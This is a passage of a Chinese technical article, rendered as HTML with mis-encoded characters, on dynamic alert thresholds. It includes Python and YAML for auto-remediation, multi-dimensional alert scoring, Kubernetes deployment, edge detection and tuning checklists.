        <span class="hljs-comment"># 4. æŸ¥è¯¢çŸ¥è¯†åº“</span>
        similar_cases = self.knowledge_base.find_similar_incidents(root_cause)
        
        <span class="hljs-comment"># 5. ç”Ÿæˆä¿®å¤å»ºè®®</span>
        remediation_plan = self._generate_remediation_plan(
            root_cause, 
            prediction, 
            similar_cases
        )
        
        <span class="hljs-comment"># 6. è‡ªåŠ¨ä¿®å¤ï¼ˆå¦‚æœç½®ä¿¡åº¦è¶³å¤Ÿé«˜ï¼‰</span>
        <span class="hljs-keyword">if</span> remediation_plan[<span class="hljs-string">'confidence'</span>] &gt; <span class="hljs-number">0.8</span>:
            execution_result = self.auto_remediation.execute(
                remediation_plan[<span class="hljs-string">'actions'</span>]
            )
            
            <span class="hljs-comment"># 7. è®°å½•åˆ°çŸ¥è¯†åº“</span>
            self.knowledge_base.add_case({
                <span class="hljs-string">'anomaly'</span>: anomaly_result,
                <span class="hljs-string">'root_cause'</span>: root_cause,
                <span class="hljs-string">'remediation'</span>: remediation_plan,
                <span class="hljs-string">'result'</span>: execution_result,
                <span class="hljs-string">'timestamp'</span>: metric_data[<span class="hljs-string">'timestamp'</span>]
            })
            
            <span class="hljs-keyword">return</span> {
                <span class="hljs-string">'status'</span>: <span class="hljs-string">'auto_remediated'</span>,
                <span class="hljs-string">'actions_taken'</span>: remediation_plan[<span class="hljs-string">'actions'</span>],
                <span class="hljs-string">'result'</span>: execution_result
            }
        <span class="hljs-keyword">else</span>:
            <span class="hljs-comment"># ç½®ä¿¡åº¦ä¸è¶³ï¼Œå‘é€å‘Šè­¦ç»™äººå·¥å¤„ç†</span>
            <span class="hljs-keyword">return</span> {
                <span class="hljs-string">'status'</span>: <span class="hljs-string">'manual_intervention_required'</span>,
                <span class="hljs-string">'root_cause'</span>: root_cause,
                <span class="hljs-string">'suggested_actions'</span>: remediation_plan[<span class="hljs-string">'actions'</span>],
                <span class="hljs-string">'confidence'</span>: remediation_plan[<span class="hljs-string">'confidence'</span>]
            }
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_gather_context</span>(<span class="hljs-params">self, metric_data</span>):
        <span class="hljs-string">"""æ”¶é›†ä¸Šä¸‹æ–‡ä¿¡æ¯"""</span>
        <span class="hljs-keyword">return</span> {
            <span class="hljs-string">'related_metrics'</span>: self._get_related_metrics(metric_data),
            <span class="hljs-string">'recent_deployments'</span>: self._get_recent_deployments(),
            <span class="hljs-string">'system_topology'</span>: self._get_system_topology(),
            <span class="hljs-string">'historical_patterns'</span>: self._get_historical_patterns(metric_data)
        }
</code></pre>
<h3 data-id="heading-37">8.3 å¤šç»´åº¦æ™ºèƒ½å‘Šè­¦</h3>
<p><strong>ä»å•æŒ‡æ ‡åˆ°å…¨å±€è§†å›¾</strong>ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">HolographicAlertingSystem</span>:
    <span class="hljs-string">"""å…¨æ¯å‘Šè­¦ç³»ç»Ÿ - å¤šç»´åº¦ç»¼åˆåˆ¤æ–­"""</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):
        self.dimensions = {
            <span class="hljs-string">'metric'</span>: MetricDimension(),      <span class="hljs-comment"># æŒ‡æ ‡ç»´åº¦</span>
            <span class="hljs-string">'topology'</span>: TopologyDimension(),  <span class="hljs-comment"># æ‹“æ‰‘ç»´åº¦</span>
            <span class="hljs-string">'business'</span>: BusinessDimension(),  <span class="hljs-comment"># ä¸šåŠ¡ç»´åº¦</span>
            <span class="hljs-string">'temporal'</span>: TemporalDimension()   <span class="hljs-comment"># æ—¶é—´ç»´åº¦</span>
        }
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">evaluate_alert</span>(<span class="hljs-params">self, event</span>):
        <span class="hljs-string">"""å¤šç»´åº¦è¯„ä¼°å‘Šè­¦"""</span>
        scores = {}
        
        <span class="hljs-comment"># 1. æŒ‡æ ‡ç»´åº¦ï¼šåŠ¨æ€é˜ˆå€¼åˆ¤æ–­</span>
        scores[<span class="hljs-string">'metric'</span>] = self.dimensions[<span class="hljs-string">'metric'</span>].evaluate(event)
        
        <span class="hljs-comment"># 2. æ‹“æ‰‘ç»´åº¦ï¼šæ˜¯å¦å½±å“å…³é”®è·¯å¾„</span>
        scores[<span class="hljs-string">'topology'</span>] = self.dimensions[<span class="hljs-string">'topology'</span>].evaluate(event)
        
        <span class="hljs-comment"># 3. ä¸šåŠ¡ç»´åº¦ï¼šæ˜¯å¦å½±å“æ ¸å¿ƒä¸šåŠ¡</span>
        scores[<span class="hljs-string">'business'</span>] = self.dimensions[<span class="hljs-string">'business'</span>].evaluate(event)
        
        <span class="hljs-comment"># 4. æ—¶é—´ç»´åº¦ï¼šæ˜¯å¦åœ¨å…³é”®æ—¶é—´çª—å£</span>
        scores[<span class="hljs-string">'temporal'</span>] = self.dimensions[<span class="hljs-string">'temporal'</span>].evaluate(event)
        
        <span class="hljs-comment"># ç»¼åˆè¯„åˆ†</span>
        final_score = self._weighted_score(scores)
        
        <span class="hljs-keyword">return</span> {
            <span class="hljs-string">'should_alert'</span>: final_score &gt; <span class="hljs-number">0.7</span>,
            <span class="hljs-string">'priority'</span>: self._calculate_priority(final_score),
            <span class="hljs-string">'dimension_scores'</span>: scores,
            <span class="hljs-string">'final_score'</span>: final_score,
            <span class="hljs-string">'reasoning'</span>: self._generate_reasoning(scores)
        }
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_weighted_score</span>(<span class="hljs-params">self, scores</span>):
        <span class="hljs-string">"""åŠ æƒè®¡ç®—ç»¼åˆåˆ†æ•°"""</span>
        weights = {
            <span class="hljs-string">'metric'</span>: <span class="hljs-number">0.4</span>,
            <span class="hljs-string">'topology'</span>: <span class="hljs-number">0.3</span>,
            <span class="hljs-string">'business'</span>: <span class="hljs-number">0.2</span>,
            <span class="hljs-string">'temporal'</span>: <span class="hljs-number">0.1</span>
        }
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">sum</span>(scores[dim] * weights[dim] <span class="hljs-keyword">for</span> dim <span class="hljs-keyword">in</span> scores)
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_generate_reasoning</span>(<span class="hljs-params">self, scores</span>):
        <span class="hljs-string">"""ç”Ÿæˆå¯è§£é‡Šçš„å‘Šè­¦åŸå› """</span>
        reasons = []
        
        <span class="hljs-keyword">if</span> scores[<span class="hljs-string">'metric'</span>] &gt; <span class="hljs-number">0.8</span>:
            reasons.append(<span class="hljs-string">"æŒ‡æ ‡ä¸¥é‡åç¦»é¢„æœŸå€¼"</span>)
        
        <span class="hljs-keyword">if</span> scores[<span class="hljs-string">'topology'</span>] &gt; <span class="hljs-number">0.7</span>:
            reasons.append(<span class="hljs-string">"å½±å“å…³é”®æœåŠ¡é“¾è·¯"</span>)
        
        <span class="hljs-keyword">if</span> scores[<span class="hljs-string">'business'</span>] &gt; <span class="hljs-number">0.7</span>:
            reasons.append(<span class="hljs-string">"å½±å“æ ¸å¿ƒä¸šåŠ¡åŠŸèƒ½"</span>)
        
        <span class="hljs-keyword">if</span> scores[<span class="hljs-string">'temporal'</span>] &gt; <span class="hljs-number">0.8</span>:
            reasons.append(<span class="hljs-string">"å‘ç”Ÿåœ¨ä¸šåŠ¡é«˜å³°æœŸ"</span>)
        
        <span class="hljs-keyword">return</span> <span class="hljs-string">"; "</span>.join(reasons)

<span class="hljs-keyword">class</span> <span class="hljs-title class_">TopologyDimension</span>:
    <span class="hljs-string">"""æ‹“æ‰‘ç»´åº¦è¯„ä¼°"""</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">evaluate</span>(<span class="hljs-params">self, event</span>):
        <span class="hljs-string">"""è¯„ä¼°äº‹ä»¶åœ¨æœåŠ¡æ‹“æ‰‘ä¸­çš„å½±å“"""</span>
        service = event[<span class="hljs-string">'service'</span>]
        
        <span class="hljs-comment"># è·å–æœåŠ¡ä¾èµ–å›¾</span>
        dependency_graph = self._get_dependency_graph()
        
        <span class="hljs-comment"># è®¡ç®—å½±å“èŒƒå›´</span>
        affected_services = self._calculate_blast_radius(
            service, 
            dependency_graph
        )
        
        <span class="hljs-comment"># æ£€æŸ¥æ˜¯å¦å½±å“å…³é”®è·¯å¾„</span>
        is_critical_path = self._is_on_critical_path(
            service, 
            dependency_graph
        )
        
        <span class="hljs-comment"># è®¡ç®—åˆ†æ•°</span>
        score = <span class="hljs-number">0.0</span>
        score += <span class="hljs-number">0.5</span> <span class="hljs-keyword">if</span> is_critical_path <span class="hljs-keyword">else</span> <span class="hljs-number">0.0</span>
        score += <span class="hljs-number">0.5</span> * (<span class="hljs-built_in">len</span>(affected_services) / <span class="hljs-built_in">len</span>(dependency_graph))
        
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">min</span>(score, <span class="hljs-number">1.0</span>)
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_calculate_blast_radius</span>(<span class="hljs-params">self, service, graph</span>):
        <span class="hljs-string">"""è®¡ç®—çˆ†ç‚¸åŠå¾„ï¼ˆå½±å“èŒƒå›´ï¼‰"""</span>
        affected = <span class="hljs-built_in">set</span>()
        queue = [service]
        
        <span class="hljs-keyword">while</span> queue:
            current = queue.pop(<span class="hljs-number">0</span>)
            <span class="hljs-keyword">if</span> current <span class="hljs-keyword">in</span> affected:
                <span class="hljs-keyword">continue</span>
            
            affected.add(current)
            
            <span class="hljs-comment"># æ·»åŠ æ‰€æœ‰ä¾èµ–å½“å‰æœåŠ¡çš„æœåŠ¡</span>
            <span class="hljs-keyword">for</span> dependent <span class="hljs-keyword">in</span> graph.get_dependents(current):
                queue.append(dependent)
        
        <span class="hljs-keyword">return</span> affected

<span class="hljs-keyword">class</span> <span class="hljs-title class_">BusinessDimension</span>:
    <span class="hljs-string">"""ä¸šåŠ¡ç»´åº¦è¯„ä¼°"""</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">evaluate</span>(<span class="hljs-params">self, event</span>):
        <span class="hljs-string">"""è¯„ä¼°å¯¹ä¸šåŠ¡çš„å½±å“"""</span>
        service = event[<span class="hljs-string">'service'</span>]
        
        <span class="hljs-comment"># è·å–æœåŠ¡çš„ä¸šåŠ¡é‡è¦æ€§</span>
        business_criticality = self._get_business_criticality(service)
        
        <span class="hljs-comment"># è·å–å½“å‰ä¸šåŠ¡é‡</span>
        current_traffic = self._get_current_traffic(service)
        normal_traffic = self._get_normal_traffic(service)
        
        <span class="hljs-comment"># æµé‡å æ¯”</span>
        traffic_ratio = current_traffic / (normal_traffic + <span class="hljs-number">1e-6</span>)
        
        <span class="hljs-comment"># ç»¼åˆè¯„åˆ†</span>
        score = business_criticality * <span class="hljs-built_in">min</span>(traffic_ratio, <span class="hljs-number">1.0</span>)
        
        <span class="hljs-keyword">return</span> score
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_get_business_criticality</span>(<span class="hljs-params">self, service</span>):
        <span class="hljs-string">"""è·å–ä¸šåŠ¡å…³é”®åº¦"""</span>
        criticality_map = {
            <span class="hljs-string">'payment'</span>: <span class="hljs-number">1.0</span>,      <span class="hljs-comment"># æ”¯ä»˜æœåŠ¡ï¼šæœ€é«˜ä¼˜å…ˆçº§</span>
            <span class="hljs-string">'order'</span>: <span class="hljs-number">0.9</span>,        <span class="hljs-comment"># è®¢å•æœåŠ¡</span>
            <span class="hljs-string">'user'</span>: <span class="hljs-number">0.8</span>,         <span class="hljs-comment"># ç”¨æˆ·æœåŠ¡</span>
            <span class="hljs-string">'search'</span>: <span class="hljs-number">0.7</span>,       <span class="hljs-comment"># æœç´¢æœåŠ¡</span>
            <span class="hljs-string">'recommendation'</span>: <span class="hljs-number">0.5</span> <span class="hljs-comment"># æ¨èæœåŠ¡</span>
        }
        <span class="hljs-keyword">return</span> criticality_map.get(service, <span class="hljs-number">0.3</span>)
</code></pre>
<h3 data-id="heading-38">8.4 äº‘åŸç”Ÿä¸å®¹å™¨åŒ–éƒ¨ç½²</h3>
<p><strong>Kubernetes Operatoræ¨¡å¼</strong>ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># dynamic-threshold-operator.yaml</span>
<span class="hljs-attr">apiVersion:</span> <span class="hljs-string">monitoring.company.com/v1</span>
<span class="hljs-attr">kind:</span> <span class="hljs-string">DynamicThreshold</span>
<span class="hljs-attr">metadata:</span>
  <span class="hljs-attr">name:</span> <span class="hljs-string">cpu-threshold</span>
  <span class="hljs-attr">namespace:</span> <span class="hljs-string">production</span>
<span class="hljs-attr">spec:</span>
  <span class="hljs-attr">metric:</span>
    <span class="hljs-attr">name:</span> <span class="hljs-string">cpu_usage</span>
    <span class="hljs-attr">source:</span> <span class="hljs-string">prometheus</span>
    <span class="hljs-attr">query:</span> <span class="hljs-string">'rate(container_cpu_usage_seconds_total[5m])'</span>
  
  <span class="hljs-attr">algorithm:</span>
    <span class="hljs-attr">type:</span> <span class="hljs-string">stl</span>
    <span class="hljs-attr">windowSize:</span> <span class="hljs-string">168h</span>
    <span class="hljs-attr">seasonalPeriod:</span> <span class="hljs-string">24h</span>
    <span class="hljs-attr">sigmaMultiplier:</span> <span class="hljs-number">3.0</span>
  
  <span class="hljs-attr">alerting:</span>
    <span class="hljs-attr">severity:</span> <span class="hljs-string">warning</span>
    <span class="hljs-attr">channels:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">dingtalk</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">email</span>
    <span class="hljs-attr">suppression:</span>
      <span class="hljs-attr">cooldownPeriod:</span> <span class="hljs-string">5m</span>
  
  <span class="hljs-attr">autoRemediation:</span>
    <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span>
    <span class="hljs-attr">actions:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">type:</span> <span class="hljs-string">scale</span>
        <span class="hljs-attr">direction:</span> <span class="hljs-string">up</span>
        <span class="hljs-attr">maxReplicas:</span> <span class="hljs-number">10</span>
</code></pre>
<h3 data-id="heading-39">8.5 è¾¹ç¼˜è®¡ç®—åœºæ™¯</h3>
<p><strong>æŒ‘æˆ˜</strong>ï¼š</p>
<ul>
<li>ç½‘ç»œä¸ç¨³å®šï¼Œæ— æ³•å®æ—¶ä¼ è¾“æ•°æ®</li>
<li>è®¡ç®—èµ„æºå—é™</li>
<li>éœ€è¦æœ¬åœ°å¿«é€Ÿå†³ç­–</li>
</ul>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼šè½»é‡çº§è¾¹ç¼˜é˜ˆå€¼å¼•æ“</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">EdgeThresholdEngine</span>:
    <span class="hljs-string">"""è¾¹ç¼˜è®¡ç®—åœºæ™¯çš„è½»é‡çº§é˜ˆå€¼å¼•æ“"""</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, max_memory_mb=<span class="hljs-number">50</span></span>):
        self.max_memory_mb = max_memory_mb
        self.history = deque(maxlen=<span class="hljs-number">168</span>)  <span class="hljs-comment"># ä»…ä¿ç•™7å¤©æ•°æ®</span>
        self.compressed_model = <span class="hljs-literal">None</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">compress_model</span>(<span class="hljs-params">self, full_model</span>):
        <span class="hljs-string">"""å‹ç¼©æ¨¡å‹ä»¥é€‚åº”è¾¹ç¼˜è®¾å¤‡"""</span>
        <span class="hljs-comment"># 1. é‡åŒ–ï¼šfloat64 â†’ float16</span>
        compressed = {
            <span class="hljs-string">'trend'</span>: full_model[<span class="hljs-string">'trend'</span>].astype(np.float16),
            <span class="hljs-string">'seasonal'</span>: full_model[<span class="hljs-string">'seasonal'</span>].astype(np.float16),
            <span class="hljs-string">'residual_std'</span>: np.float16(full_model[<span class="hljs-string">'residual_std'</span>])
        }
        
        <span class="hljs-comment"># 2. é™é‡‡æ ·ï¼šä¿ç•™å…³é”®ç‚¹</span>
        compressed[<span class="hljs-string">'trend'</span>] = self._downsample(compressed[<span class="hljs-string">'trend'</span>], factor=<span class="hljs-number">2</span>)
        compressed[<span class="hljs-string">'seasonal'</span>] = self._downsample(compressed[<span class="hljs-string">'seasonal'</span>], factor=<span class="hljs-number">2</span>)
        
        self.compressed_model = compressed
        <span class="hljs-keyword">return</span> compressed
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">lightweight_detection</span>(<span class="hljs-params">self, value, timestamp</span>):
        <span class="hljs-string">"""è½»é‡çº§å¼‚å¸¸æ£€æµ‹"""</span>
        <span class="hljs-keyword">if</span> self.compressed_model <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
            <span class="hljs-keyword">return</span> {<span class="hljs-string">'is_alert'</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">'reason'</span>: <span class="hljs-string">'model_not_ready'</span>}
        
        <span class="hljs-comment"># ä½¿ç”¨ç®€åŒ–çš„åˆ¤æ–­é€»è¾‘</span>
        hour_of_day = timestamp.hour
        expected = (
            self.compressed_model[<span class="hljs-string">'trend'</span>][-<span class="hljs-number">1</span>] + 
            self.compressed_model[<span class="hljs-string">'seasonal'</span>][hour_of_day % <span class="hljs-number">24</span>]
        )
        
        threshold = <span class="hljs-number">3</span> * self.compressed_model[<span class="hljs-string">'residual_std'</span>]
        
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">abs</span>(value - expected) &gt; threshold:
            <span class="hljs-keyword">return</span> {
                <span class="hljs-string">'is_alert'</span>: <span class="hljs-literal">True</span>,
                <span class="hljs-string">'expected'</span>: <span class="hljs-built_in">float</span>(expected),
                <span class="hljs-string">'threshold'</span>: <span class="hljs-built_in">float</span>(threshold),
                <span class="hljs-string">'deviation'</span>: <span class="hljs-built_in">float</span>(value - expected)
            }
        <span class="hljs-keyword">else</span>:
            <span class="hljs-keyword">return</span> {<span class="hljs-string">'is_alert'</span>: <span class="hljs-literal">False</span>}
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">sync_with_cloud</span>(<span class="hljs-params">self, cloud_endpoint</span>):
        <span class="hljs-string">"""ä¸äº‘ç«¯åŒæ­¥æ¨¡å‹"""</span>
        <span class="hljs-keyword">try</span>:
            <span class="hljs-comment"># ä¸Šä¼ æœ¬åœ°æ•°æ®</span>
            self._upload_data(cloud_endpoint)
            
            <span class="hljs-comment"># ä¸‹è½½æ›´æ–°çš„æ¨¡å‹</span>
            updated_model = self._download_model(cloud_endpoint)
            self.compressed_model = self.compress_model(updated_model)
            
            <span class="hljs-keyword">return</span> {<span class="hljs-string">'status'</span>: <span class="hljs-string">'synced'</span>}
        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            <span class="hljs-comment"># ç½‘ç»œæ•…éšœæ—¶ç»§ç»­ä½¿ç”¨æœ¬åœ°æ¨¡å‹</span>
            <span class="hljs-keyword">return</span> {<span class="hljs-string">'status'</span>: <span class="hljs-string">'offline'</span>, <span class="hljs-string">'error'</span>: <span class="hljs-built_in">str</span>(e)}
</code></pre>
<h2 data-id="heading-40">ä¹ã€æœ€ä½³å®è·µæ€»ç»“</h2>
<h3 data-id="heading-41">9.1 å®æ–½è·¯çº¿å›¾</h3>
<p><strong>é˜¶æ®µä¸€ï¼šè¯•ç‚¹éªŒè¯ï¼ˆ1-2å‘¨ï¼‰</strong></p>
<ol>
<li>é€‰æ‹©1-2ä¸ªæ ¸å¿ƒæœåŠ¡è¿›è¡Œè¯•ç‚¹</li>
<li>ä¸ç°æœ‰å›ºå®šé˜ˆå€¼å¹¶è¡Œè¿è¡Œ</li>
<li>æ”¶é›†æ•°æ®ï¼Œå¯¹æ¯”æ•ˆæœ</li>
</ol>
<p><strong>é˜¶æ®µäºŒï¼šå°èŒƒå›´æ¨å¹¿ï¼ˆ1ä¸ªæœˆï¼‰</strong></p>
<ol>
<li>æ‰©å±•åˆ°10-20ä¸ªæœåŠ¡</li>
<li>å»ºç«‹è¿ç»´åé¦ˆæœºåˆ¶</li>
<li>ä¼˜åŒ–å‚æ•°é…ç½®</li>
</ol>
<p><strong>é˜¶æ®µä¸‰ï¼šå…¨é¢éƒ¨ç½²ï¼ˆ2-3ä¸ªæœˆï¼‰</strong></p>
<ol>
<li>è¦†ç›–æ‰€æœ‰å…³é”®æœåŠ¡</li>
<li>é›†æˆåˆ°ç°æœ‰ç›‘æ§å¹³å°</li>
<li>åŸ¹è®­è¿ç»´å›¢é˜Ÿ</li>
</ol>
<p><strong>é˜¶æ®µå››ï¼šæŒç»­ä¼˜åŒ–ï¼ˆé•¿æœŸï¼‰</strong></p>
<ol>
<li>å¯ç”¨è‡ªé€‚åº”å­¦ä¹ </li>
<li>é›†æˆAIOpsèƒ½åŠ›</li>
<li>æ‰©å±•åˆ°æ›´å¤šåœºæ™¯</li>
</ol>
<h3 data-id="heading-42">9.2 é…ç½®è°ƒä¼˜æŒ‡å—</h3>
<p><strong>çª—å£å¤§å°é€‰æ‹©</strong>ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">recommend_window_size</span>(<span class="hljs-params">metric_type, data_pattern</span>):
    <span class="hljs-string">"""æ¨èçª—å£å¤§å°"""</span>
    <span class="hljs-keyword">if</span> data_pattern == <span class="hljs-string">'high_volatility'</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-number">24</span>  <span class="hljs-comment"># é«˜æ³¢åŠ¨ï¼šçŸ­çª—å£</span>
    <span class="hljs-keyword">elif</span> data_pattern == <span class="hljs-string">'stable'</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-number">168</span>  <span class="hljs-comment"># ç¨³å®šï¼šæ ‡å‡†çª—å£</span>
    <span class="hljs-keyword">elif</span> data_pattern == <span class="hljs-string">'long_term_trend'</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-number">720</span>  <span class="hljs-comment"># é•¿æœŸè¶‹åŠ¿ï¼šé•¿çª—å£</span>
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-number">168</span>  <span class="hljs-comment"># é»˜è®¤</span>
</code></pre>
<p><strong>Sigmaå€æ•°è°ƒæ•´</strong>ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">recommend_sigma_multiplier</span>(<span class="hljs-params">false_positive_rate</span>):
    <span class="hljs-string">"""æ ¹æ®è¯¯æŠ¥ç‡æ¨èsigmaå€æ•°"""</span>
    <span class="hljs-keyword">if</span> false_positive_rate &gt; <span class="hljs-number">0.5</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-number">4.0</span>  <span class="hljs-comment"># è¯¯æŠ¥ç‡é«˜ï¼šæ”¾å®½é˜ˆå€¼</span>
    <span class="hljs-keyword">elif</span> false_positive_rate &gt; <span class="hljs-number">0.3</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-number">3.5</span>
    <span class="hljs-keyword">elif</span> false_positive_rate &gt; <span class="hljs-number">0.1</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-number">3.0</span>  <span class="hljs-comment"># æ ‡å‡†</span>
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-number">2.5</span>  <span class="hljs-comment"># è¯¯æŠ¥ç‡ä½ï¼šå¯ä»¥æ”¶ç´§</span>
</code></pre>
<h3 data-id="heading-43">9.3 ç›‘æ§æŒ‡æ ‡ä½“ç³»</h3>
<p><strong>ç³»ç»Ÿå¥åº·åº¦æŒ‡æ ‡</strong>ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">SystemHealthMetrics</span>:
    <span class="hljs-string">"""ç³»ç»Ÿå¥åº·åº¦æŒ‡æ ‡"""</span>
    
<span class="hljs-meta">    @staticmethod</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">calculate_metrics</span>(<span class="hljs-params">alerting_system</span>):
        <span class="hljs-string">"""è®¡ç®—å…³é”®æŒ‡æ ‡"""</span>
        <span class="hljs-keyword">return</span> {
            <span class="hljs-comment"># å‘Šè­¦è´¨é‡æŒ‡æ ‡</span>
            <span class="hljs-string">'precision'</span>: alerting_system.get_precision(),
            <span class="hljs-string">'recall'</span>: alerting_system.get_recall(),
            <span class="hljs-string">'f1_score'</span>: alerting_system.get_f1_score(),
            
            <span class="hljs-comment"># æ•ˆç‡æŒ‡æ ‡</span>
            <span class="hljs-string">'alert_volume_reduction'</span>: alerting_system.get_volume_reduction(),
            <span class="hljs-string">'mttr'</span>: alerting_system.get_mean_time_to_resolve(),
            <span class="hljs-string">'mttd'</span>: alerting_system.get_mean_time_to_detect(),
            
            <span class="hljs-comment"># ç³»ç»Ÿæ€§èƒ½æŒ‡æ ‡</span>
            <span class="hljs-string">'avg_processing_time'</span>: alerting_system.get_avg_processing_time(),
            <span class="hljs-string">'model_confidence'</span>: alerting_system.get_avg_confidence(),
            <span class="hljs-string">'data_coverage'</span>: alerting_system.get_data_coverage(),
            
            <span class="hljs-comment"># ä¸šåŠ¡å½±å“æŒ‡æ ‡</span>
            <span class="hljs-string">'prevented_incidents'</span>: alerting_system.get_prevented_incidents(),
            <span class="hljs-string">'cost_savings'</span>: alerting_system.calculate_cost_savings()
        }
</code></pre>
<h3 data-id="heading-44">9.4 æ•…éšœæ’æŸ¥æ¸…å•</h3>
<p><strong>é—®é¢˜ï¼šé˜ˆå€¼è®¡ç®—å¤±è´¥</strong></p>
<pre><code class="hljs">â–¡ æ£€æŸ¥æ•°æ®å®Œæ•´æ€§ï¼ˆæ˜¯å¦æœ‰å¤§é‡ç¼ºå¤±å€¼ï¼‰
â–¡ æ£€æŸ¥æ•°æ®èŒƒå›´ï¼ˆæ˜¯å¦æœ‰å¼‚å¸¸çš„æå€¼ï¼‰
â–¡ æ£€æŸ¥çª—å£å¤§å°ï¼ˆæ˜¯å¦æœ‰è¶³å¤Ÿçš„å†å²æ•°æ®ï¼‰
â–¡ æ£€æŸ¥å­£èŠ‚å‘¨æœŸè®¾ç½®ï¼ˆæ˜¯å¦ä¸å®é™…ä¸šåŠ¡åŒ¹é…ï¼‰
â–¡ æŸ¥çœ‹æ—¥å¿—ä¸­çš„é”™è¯¯ä¿¡æ¯
</code></pre>
<p><strong>é—®é¢˜ï¼šå‘Šè­¦è¿‡å¤š</strong></p>
<pre><code class="hljs">â–¡ æ£€æŸ¥sigmaå€æ•°ï¼ˆæ˜¯å¦è®¾ç½®è¿‡å°ï¼‰
â–¡ æ£€æŸ¥æ˜¯å¦æœ‰æŒç»­çš„å¼‚å¸¸çŠ¶æ€ï¼ˆç³»ç»Ÿæ˜¯å¦çœŸçš„æœ‰é—®é¢˜ï¼‰
â–¡ æ£€æŸ¥å‘Šè­¦æŠ‘åˆ¶é…ç½®ï¼ˆå†·å´æœŸæ˜¯å¦è¿‡çŸ­ï¼‰
â–¡ æ£€æŸ¥æ˜¯å¦æœ‰çªå‘äº‹ä»¶ï¼ˆæ˜¯å¦éœ€è¦æ³¨å†Œäº‹ä»¶ï¼‰
â–¡ å¯ç”¨è‡ªé€‚åº”å­¦ä¹ ï¼ˆè®©ç³»ç»Ÿè‡ªåŠ¨è°ƒæ•´ï¼‰
</code></pre>
<p><strong>é—®é¢˜ï¼šæ¼æŠ¥å…³é”®æ•…éšœ</strong></p>
<pre><code class="hljs">â–¡ æ£€æŸ¥sigmaå€æ•°ï¼ˆæ˜¯å¦è®¾ç½®è¿‡å¤§ï¼‰
â–¡ æ£€æŸ¥çª—å£å¤§å°ï¼ˆæ˜¯å¦è¿‡é•¿å¯¼è‡´å“åº”æ…¢ï¼‰
â–¡ æ£€æŸ¥æ˜¯å¦å¯ç”¨å¤šç»´åº¦æ£€æµ‹ï¼ˆå•ä¸€æŒ‡æ ‡å¯èƒ½ä¸å¤Ÿï¼‰
â–¡ æ£€æŸ¥ä¸šåŠ¡å…³é”®åº¦é…ç½®ï¼ˆæ˜¯å¦æ­£ç¡®æ ‡è®°å…³é”®æœåŠ¡ï¼‰
â–¡ è€ƒè™‘æ·»åŠ åŸºäºè§„åˆ™çš„å…œåº•å‘Šè­¦
</code></pre>
<p>åŠ¨æ€é˜ˆå€¼ç³»ç»Ÿé€šè¿‡<strong>è‡ªæˆ‘å­¦ä¹ </strong>å’Œ<strong>è‡ªé€‚åº”è°ƒæ•´</strong>ï¼Œä»æ ¹æœ¬ä¸Šè§£å†³äº†ä¼ ç»Ÿå›ºå®šé˜ˆå€¼çš„ä¸‰å¤§ç—›ç‚¹ï¼š</p>
<ol>
<li><strong>å‘Šè­¦ç–²åŠ³</strong>Â â†’ å‘Šè­¦é‡å‡å°‘60-80%</li>
<li><strong>è¯¯æŠ¥ç‡é«˜</strong>Â â†’ æœ‰æ•ˆå‘Šè­¦æ¯”ä¾‹æå‡è‡³70%+</li>
<li><strong>æ— æ³•é€‚åº”å˜åŒ–</strong>Â â†’ è‡ªåŠ¨é€‚åº”ä¸šåŠ¡å¢é•¿å’Œå‘¨æœŸå˜åŒ–</li>
</ol>
<h3 data-id="heading-45">10.2 å…³é”®æŠ€æœ¯è¦ç‚¹</h3>
<ul>
<li><strong>STLæ—¶é—´åºåˆ—åˆ†è§£</strong>ï¼šå°†å¤æ‚çš„æ—¶é—´åºåˆ—æ‹†è§£ä¸ºè¶‹åŠ¿ã€å­£èŠ‚ã€æ®‹å·®</li>
<li><strong>3ÏƒåŸåˆ™</strong>ï¼šåŸºäºç»Ÿè®¡å­¦çš„å¼‚å¸¸åˆ¤æ–­æ ‡å‡†</li>
